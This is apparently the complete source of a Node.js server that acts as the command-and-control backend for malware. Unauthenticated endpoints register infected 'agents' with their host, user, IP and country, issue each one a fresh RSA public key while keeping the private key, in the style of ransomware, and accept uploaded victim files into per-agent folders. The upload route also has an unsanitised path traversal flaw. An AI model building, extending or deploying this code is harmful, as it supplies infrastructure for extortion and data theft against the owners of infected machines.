const express = require('express');
const mysql = require('mysql');
const crypto = require("crypto");
const https = require('https');
const multer = require("multer");
var cors = require('cors');
const fs = require('fs');
const path = require('path');

const httpsOptions = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

try {
  const folderName = "/CTHULHU/users"
  if (!fs.existsSync(folderName)) {
    fs.mkdirSync(folderName);
  }
} catch (err) {
  console.log(err)
}

const app = express();

const port = 5000;

const USER_ADMIN_ROLE = 1
const USER_READER_ROLE = 2
const USER_SCAN_ROLE = 3

app.use(cors()) // setup cors headers
app.use(express.json()) // for parsing application/json


// Configure multer with a dynamic destination folder
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "/tmp/");
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  },
});

const upload = multer({ storage });

// Set up MySQL connection
// change the cread to your own
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_MAIN
});

// Connect to MySQL
db.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL database: ' + err.stack);
    return;
  }
  console.log('Connected to MySQL database as ID ' + db.threadId);
});

const checkToken = async (username, token, userId = -1) => {
  return new Promise((resolve, reject) => {
    db.query('SELECT * FROM users WHERE (user_name = ? OR user_id = ?) AND user_token = ?', [username, userId, token], (error, results) => {
      if (error) {
        return reject(error);
      }
      let userTokenInfo = { userId: -1, username: "", userRole: -1, isTokenValid: false }
      if (results.length > 0) {
        userTokenInfo.userId = results[0].user_id
        userTokenInfo.username = results[0].user_name
        userTokenInfo.userRole = results[0].role_id
        userTokenInfo.isTokenValid = true
      }
      resolve(userTokenInfo);
    })
  });
}


// API endpoint for receiving data
app.post('/api/agent/new', (req, res) => {
  console.log("POST api agent new")
  var JSON_RES = { data: {}, error: {} }
  if (
    req.body != undefined &&
    req.body.versionOS != undefined &&
    req.body.host != undefined &&
    req.body.hookUser != undefined &&
    req.body.ip != undefined &&
    req.body.country != undefined
  ) {

    // Generate RSA key pair
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      }
    });

    const publicKeyStr = publicKey.toString();

    // Insert data into MySQL
    const sql = `INSERT INTO agent (versionOS, host, hookUser, privKey, pubKey, ip, country) VALUES (?, ?, ?, ?, ?, ?, ?)`;
    const values = [req.body.versionOS, req.body.host, req.body.hookUser, privateKey.toString(), publicKeyStr, req.body.ip, req.body.country];
    console.log(req.body)
    // Insert data into MySQL without keys
    db.query(sql, values, (err, result) => {
      if (err) {
        JSON_RES.error = { errorMsg: "Error inserting data into MySQL " + err.stack }
        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }
      console.log('Inserted data into MySQL with ID ' + result.insertId);
      JSON_RES.data = { id: result.insertId, publicKey: publicKeyStr }

      try {
        const folderName = path.join('/CTHULHU/users', result.insertId.toString());
        if (!fs.existsSync(folderName)) {
          fs.mkdirSync(folderName);
        }
      } catch (err) {
        JSON_RES.error = { errorMsg: err }

        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }

      res.status(200)
      res.json(JSON_RES);
      res.end();
    });

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.post('/api/file/upload/:user_folder', upload.single('file'), (req, res) => {
  // Access the uploaded file details
  const file = req.file;
  if (!file) {
    res.status(400).send('No file uploaded.');
    return;
  }

  var JSON_RES = { data: {}, error: {} }

  const sourceFilePath = "/tmp/" + req.file.originalname;
  const destinationFilePath = "/CTHULHU/users/" + req.params.user_folder + "/" + req.file.originalname;

  // Check if the destination file exists
  if (fs.existsSync(destinationFilePath)) {
    // Read the contents of the source file
    fs.readFile(sourceFilePath, (err, data) => {
      if (err) {
        console.error('Error reading the source file:', err);
        return;
      }

      // Append the contents to the destination file
      fs.appendFile(destinationFilePath, data, (err) => {
        if (err) {
          console.error('Error appending to the destination file:', err);
          return;
        }

        console.log('Contents appended successfully!');
      });
    });
  } else {
    // Create the destination file and write the contents of the source file to it
    fs.copyFile(sourceFilePath, destinationFilePath, (err) => {
      if (err) {
        console.error('Error creating the destination file:', err);
        return;
      }

      console.log('Destination file created and contents copied successfully!');
    });
  }

  fs.unlink(sourceFilePath, (err) => {
    if (err) {
      console.error('Error deleting the source file:', err);
      return;
    }

    console.log('Source file deleted successfully!');
  });

  // Do something with the file, such as saving it to a specific location or performing further processing

  JSON_RES.data = { success: `${file.originalname} uploaded successfully.` }

  res.status(200)
  res.json(JSON_RES);
  res.end();
});


// ------------------------------------------------------------USER_ROUTES----------------------------------------------------

app.post('/auth', (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  // Ensure the input fields exists and are not empty
  if (req.body != undefined && req.body.username != undefined && req.body.password != undefined) {
    // Capture the input fields
    const username = req.body.username;
    const password = crypto.pbkdf2Sync(req.body.password, username, 1000, 64, `sha512`).toString(`hex`);
    // Execute SQL query that'll select the account from the database based on the specified username and password
    db.query('SELECT * FROM users WHERE user_name = ? AND user_password = ?', [username, password], (error, results) => {
      // If there is an issue with the query, output the error
      if (error) throw error;
      // If the account exists
      if (results.length > 0) {
        // Login 
        const timestamp = new Date().getTime();
        const token = crypto.pbkdf2Sync(req.body.password + username, timestamp.toString(10), 10, 64, `sha512`).toString(`hex`);
        // Execute SQL query to set new token for auth
        db.query('UPDATE users SET user_token = ? WHERE user_name = ?', [token, username], (error) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          JSON_RES.data = { username: username, token: token }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "Incorrect Username and/or Password" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    });
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.post('/createUser', (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  // Ensure the input fields exists and are not empty
  if (req.body != undefined && req.body.username != undefined && req.body.password != undefined && req.body.email != undefined) {
    // Capture the input fields
    const username = req.body.username;
    const email = req.body.email;
    // Check if user already exists
    db.query('SELECT * FROM users WHERE user_name = ? OR user_email = ?', [username, email], (error, results) => {
      // If there is an issue with the query, output the error
      if (error) throw error;
      // If the account exists
      if (results.length > 0) {
        JSON_RES.error = { errorMsg: "User already exists" }
        res.status(409)
        res.json(JSON_RES);
        res.end();
      } else {
        //hash password
        const password = crypto.pbkdf2Sync(req.body.password, username,
          1000, 64, `sha512`).toString(`hex`);

        // Execute SQL query that'll create new user
        db.query('INSERT INTO users ( user_name, user_email, user_password, role_id) VALUES (?, ?, ?, ?)', [username, email, password, USER_READER_ROLE], (error) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          const timestamp = new Date().getTime();
          const token = crypto.pbkdf2Sync(req.body.password + username, timestamp.toString(10), 10, 64, `sha512`).toString(`hex`);
          // Execute SQL query to set new token for auth
          db.query('UPDATE users SET user_token = ? WHERE user_name = ?', [token, username], (error) => {
            // If there is an issue with the query, output the error
            if (error) throw error;

            JSON_RES.data = { username: username, token: token }
            res.status(201)
            res.json(JSON_RES);
            res.end();
          });
        });
      }
    });

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.get('/getAgentInfo', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.reqUsername != undefined && req.query.reqToken != undefined && req.query.agentID != undefined) {
    const reqUsername = req.query.reqUsername
    const reqToken = req.query.reqToken
    const agentId = req.query.agentID

    const reqUserInfo = await checkToken(reqUsername, reqToken)
    if (reqUserInfo.isTokenValid) {
      if (reqUserInfo.userRole == USER_ADMIN_ROLE) {
        db.query('SELECT * FROM agent WHERE agentID = ?', [agentId], (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          if (results.length > 0) {
            JSON_RES.data = { agent: results[0] }
          } else {
            JSON_RES.error = { errorMsg: "Agent does not exist" }
            res.status(404)
          }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not admin" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getUserInfo', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.reqUsername != undefined && req.query.reqToken != undefined && (req.query.username != undefined || req.query.userId != undefined)) {
    const reqUsername = req.query.reqUsername
    const reqToken = req.query.reqToken
    const username = req.query.username
    const userId = req.query.userId

    const reqUserInfo = await checkToken(reqUsername, reqToken)
    if (reqUserInfo.isTokenValid) {
      if (reqUserInfo.userRole == USER_ADMIN_ROLE || reqUsername == username) {
        db.query('SELECT * FROM users WHERE user_name = ? OR user_id = ?', [username, userId], (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          if (results.length > 0) {
            JSON_RES.data = { user: results[0] }
          } else {
            JSON_RES.error = { errorMsg: "User does not exist" }
            res.status(404)
          }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not admin" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getAllUsers', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.username != undefined && req.query.token != undefined) {
    const username = req.query.username
    const token = req.query.token

    const userInfo = await checkToken(username, token)
    if (userInfo.isTokenValid) {
      if (userInfo.userRole == USER_ADMIN_ROLE) {
        db.query('SELECT user_name, user_email, role_id FROM users', (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;
          JSON_RES.data = { users: results }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not admin" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getAllAgents', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.username != undefined && req.query.token != undefined) {
    const username = req.query.username
    const token = req.query.token

    const userInfo = await checkToken(username, token)
    if (userInfo.isTokenValid) {
      if (userInfo.userRole == USER_ADMIN_ROLE) {
        db.query('SELECT agentID, host, versionOS, hookUser, ip FROM agent', (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;
          JSON_RES.data = { agents: results }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not admin" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

// API endpoint for receiving files

// Start the server
/* app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
}); */

https.createServer(httpsOptions, app).listen(port);